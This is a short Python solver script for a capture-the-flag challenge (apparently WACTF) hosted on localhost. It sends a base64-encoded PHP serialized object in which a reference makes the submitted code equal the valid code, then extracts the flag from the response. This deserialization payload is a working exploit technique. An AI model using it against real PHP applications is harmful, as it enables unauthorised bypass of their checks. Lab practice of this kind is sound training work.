import requests, time, re

flag_regex = re.compile(r'WACTF{.*?}')

URL = "http://localhost:1338"

print("Sending payload...")
r = requests.get(f"{URL}/?input=TzoxMToiZ2J1Y2tzX2NvZGUiOjI6e3M6MTA6InZhbGlkX2NvZGUiO047czoxNDoic3VibWl0dGVkX2NvZGUiO1I6Mjt9")

if r.status_code != 200:
    print("Issue sending payload.")
    exit(1)

result = flag_regex.search(r.text)

if result:
    print(result.group(0))
    exit(0)

print("Error getting flag.")